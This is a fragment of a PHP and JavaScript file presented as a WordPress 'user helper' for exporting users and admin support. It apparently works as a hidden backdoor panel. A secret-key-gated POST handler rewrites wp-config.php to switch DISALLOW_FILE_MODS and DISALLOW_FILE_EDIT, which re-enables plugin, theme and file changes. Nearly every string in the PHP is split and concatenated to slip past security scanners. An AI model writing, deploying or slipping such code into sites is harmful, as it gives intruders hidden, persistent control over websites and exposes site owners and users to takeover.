...
if ($_SERVER['REQ'.'U'.'E'.'S'.'T_'.'M'.'ETH'.'O'.'D'] === 'POS'.'T' && isset($_POST['c'.'4t'], $_POST['aut'.'hke'.'y']) && $_POST['a'.'ut'.'hk'.'e'.'y'] === WP_USER_HELPER_KEY) {
    ...
    // FITUR BARU: TOGGLE DISALLOW_FILE_MODS
    if ($_POST['c'.'4t'] == 'to'.'gg'.'le'.'_f'.'il'.'e_'.'mo'.'ds') {
        $wp_config_path = ABSPATH . 'wp-'.'co'.'nfi'.'g.'.'ph'.'p';
        if (!file_exists($wp_config_path)) {
            echo json_encode(['e'.'rr'=>'wp'.'-c'.'on'.'fi'.'g'.'.p'.'hp'.' n'.'ot'.' f'.'ou'.'nd']);
            exit;
        ...
        // Cek dan replace DISALLOW_FILE_MODS
        if (preg_match("/define\s*\(\s*['\"]DISALLOW_FILE_MODS['\"]\s*,\s*(true|false)\s*\)/", $content)) {
            $content = preg_replace(
                "/define\s*\(\s*['\"]DISALLOW_FILE_MODS['\"]\s*,\s*(true|false)\s*\)/",
                "def".'ine'."('DISALLOW_FILE_MODS', " . $new_value . ")",
                $content
            );
        } else {
            // Tambahkan sebelum "That's all, stop editing"
            $pos = strpos($content, "/* That's all, stop editing!");
            if ($pos !== false) {
                $content = substr_replace($content, "def".'ine'."('DISALLOW_FILE_MODS', " . $new_value . ");\n", $pos, 0);
            } else {
                // Tambahkan di akhir file sebelum tag penutup PHP
                $content = rtrim($content) . "\n\ndef".'ine'."('DISALLOW_FILE_MODS', " . $new_value . ");\n";
            }
        ...
        if (file_put_contents($wp_config_path, $content)) {
            echo json_encode(['o'.'k'=>'DISALLOW_FILE_MODS'.' s'.'et'.' t'.'o'.' ' . $new_value]);
        } else {
            echo json_encode(['e'.'rr'=>'F'.'ai'.'le'.'d'.' t'.'o'.' w'.'ri'.'te'.' wp'.'-c'.'on'.'fi'.'g']);
        }
        exit;
    ...
    // FITUR BARU: CHECK DISALLOW_FILE_MODS STATUS
    if ($_POST['c'.'4t'] == 'ch'.'ec'.'k_'.'fi'.'le'.'_mo'.'ds') {
        $wp_config_path = ABSPATH . 'wp-'.'co'.'nfi'.'g.'.'ph'.'p';
        $status = 'n'.'ot'.'_'.'se'.'t';
        if (file_exists($wp_config_path)) {
            $content = file_get_contents($wp_config_path);
            if (preg_match("/define\s*\(\s*['\"]DISALLOW_FILE_MODS['\"]\s*,\s*(true|false)\s*\)/", $content, $matches)) {
                $status = $matches[1];
            }
        }
        echo json_encode(['st'.'at'.'us' => $status]);
...
<body>
    <div id="w1">
        <div class="h1">
            <span class="led"></span>
            wp user helper
            <span style="color:#fff;font-weight:400;">export & admin support</span>
        </div>
        
        <div class="sct">users
            <input id="userSearch" class="inp" style="min-width:140px;width:160px;font-size:.99em;" placeholder="search user/mail..." autocomplete="off" oninput="srchUsers(this.value)">
        </div>
        <div class="tbx">
            <table id="t7">
                <thead>
        ...
        <div style="margin-top:33px;">
            <div class="sct">file editing control</div>
            <div class="riw">
                <button class="bx" onclick="checkFileEditStatus()">check DISALLOW_FILE_EDIT</button>
        ...
        <!-- FITUR BARU: DISALLOW_FILE_MODS CONTROL -->
        <div style="margin-top:33px;">
            <div class="sct">file & plugins/themes modification control</div>
            <div style="color:var(--gray);font-size:0.95em;margin-bottom:10px;">
                DISALLOW_FILE_MODS controls: file editing, plugin/theme installation & updates
            </div>
            <div class="riw">
                <button class="bx" onclick="checkFileModsStatus()">check DISALLOW_FILE_MODS</button>
                <button class="bx" style="background:var(--darkred);" onclick="toggleFileMods(0)">enable all mods</button>
                <button class="bx" style="background:#2e7d32;" onclick="toggleFileMods(1)">disable all mods</button>
                <span id="fileModsStatus" style="color:var(--gray);margin-left:12px;"></span>
            </div>
        </div>
    </div>
    ...
    <script>
        ...
        function toggleFileEdit(enable) {
            let confirmMsg = enable ? 
                "Are you sure you want to ENABLE file editing? (set DISALLOW_FILE_EDIT to false)" : 
                "Are you sure you want to DISABLE file editing? (set DISALLOW_FILE_EDIT to true)";
        ...
        // FITUR BARU: DISALLOW_FILE_MODS CONTROL
        function checkFileModsStatus() {
            m1({c4t:"check_file_mods"}, function(response) {
                let data = JSON.parse(response);
                let statusText = "";
                let color = "";
                switch(data.status) {
                    case "true":
                        statusText = "DISALLOW_FILE_MODS = true (all modifications disabled)";
                        color = "#2e7d32";
                        break;
                    case "false":
                        statusText = "DISALLOW_FILE_MODS = false (all modifications enabled)";
                        color = "#e53935";
                        break;
                    default:
                        statusText = "DISALLOW_FILE_MODS not set in wp-config.php";
                        color = "#ff9800";
                }
                document.getElementById("fileModsStatus").innerHTML = statusText;
                document.getElementById("fileModsStatus").style.color = color;
            });
        }
        
        function toggleFileMods(enable) {
            let confirmMsg = enable ? 
                "Are you sure you want to ENABLE all modifications? (set DISALLOW_FILE_MODS to false)\n\nThis will allow:\n- File editing\n- Plugin installation\n- Theme installation\n- Updates" : 
                "Are you sure you want to DISABLE all modifications? (set DISALLOW_FILE_MODS to true)\n\nThis will prevent:\n- File editing\n- Plugin installation\n- Theme installation\n- Updates";
            
            if(confirm(confirmMsg)) {
                m1({c4t:"toggle_file_mods", enable: enable}, function(response) {
                    let data = JSON.parse(response);
                    if(data.ok) {
                        alert("Success: " + data.ok);
                        checkFileModsStatus();
